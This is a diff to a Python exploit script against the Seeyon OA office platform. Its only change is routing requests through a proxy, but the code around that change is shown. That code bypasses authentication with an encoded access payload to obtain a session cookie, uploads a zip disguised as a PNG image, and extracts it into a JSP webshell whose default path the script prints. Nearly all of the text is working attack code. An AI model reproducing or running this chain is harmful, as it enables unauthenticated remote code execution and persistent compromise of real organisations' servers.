@@ -5,7 +5,10 @@ import requests
 import sys
 import time
 import re
-from requests.packages.urllib3.exceptions import InsecureRequestWarning
+
+requests.packages.urllib3.disable_warnings()
+
+from Config.config_proxies import proxies
 
 # 脚本信息
 ######################################################
@@ -24,8 +27,8 @@ def poc(target):
     }
     data = "method=access&enc=TT5uZnR0YmhmL21qb2wvZXBkL2dwbWVmcy9wcWZvJ04+LjgzODQxNDMxMjQzNDU4NTkyNzknVT4zNjk0NzI5NDo3MjU4&clientPath=127.0.0.1"
     try:
-        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
-        response = requests.post(url=test_url1, headers=headers, data=data, verify=False, timeout=5)
+
+        response = requests.post(url=test_url1, headers=headers, data=data, verify=False, timeout=5,proxies=proxies)
         if response.status_code == 200 and "a8genius.do" in response.text:
             result['target'] = target
             result['poc'] = NAME
@@ -41,8 +44,7 @@ def exp(target_url):
     }
     data = "method=access&enc=TT5uZnR0YmhmL21qb2wvZXBkL2dwbWVmcy9wcWZvJ04+LjgzODQxNDMxMjQzNDU4NTkyNzknVT4zNjk0NzI5NDo3MjU4&clientPath=127.0.0.1"
     try:
-        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
-        response = requests.post(url=vuln_url, headers=headers, data=data, verify=False, timeout=5)
+        response = requests.post(url=vuln_url, headers=headers, data=data, verify=False, timeout=5,proxies=proxies)
         if response.status_code == 200 and "a8genius.do" in response.text and 'set-cookie' in str(response.headers).lower():
             cookies = response.cookies
             cookies = requests.utils.dict_from_cookiejar(cookies)
@@ -52,7 +54,7 @@ def exp(target_url):
             files = [('file1', ('360icon.png', open('platform.zip', 'rb'), 'image/png'))]
             headers = {'Cookie':"JSESSIONID=%s" % cookie}
             data = {'callMethod': 'resizeLayout', 'firstSave': "true", 'takeOver':"false", "type": '0','isEncrypt': "0"}
-            response = requests.post(url=targeturl,files=files,data=data, headers=headers,timeout=60,verify=False)
+            response = requests.post(url=targeturl,files=files,data=data, headers=headers,timeout=60,verify=False,proxies=proxies)
             #print(response.text)
             reg = re.findall('fileurls=fileurls\+","\+\'(.+)\'',response.text,re.I)
             if len(reg)==0:
@@ -71,7 +73,7 @@ def exp2(target_url, cookie, reg, headers):
     headers['Content-Type']="application/x-www-form-urlencoded"
     print("[o] 目标 {} 正在解压文件....".format(target_url))
     try:
-        response = requests.post(vuln_url, data=post,headers=headers,timeout=60,verify=False)
+        response = requests.post(vuln_url, data=post,headers=headers,timeout=60,verify=False,proxies=proxies)
         if response.status_code == 500:
             print("[+]{}/seeyon/common/designer/pageLayout/123.jsp szxsd 默认Webshell地址".format(target_url))
         else:
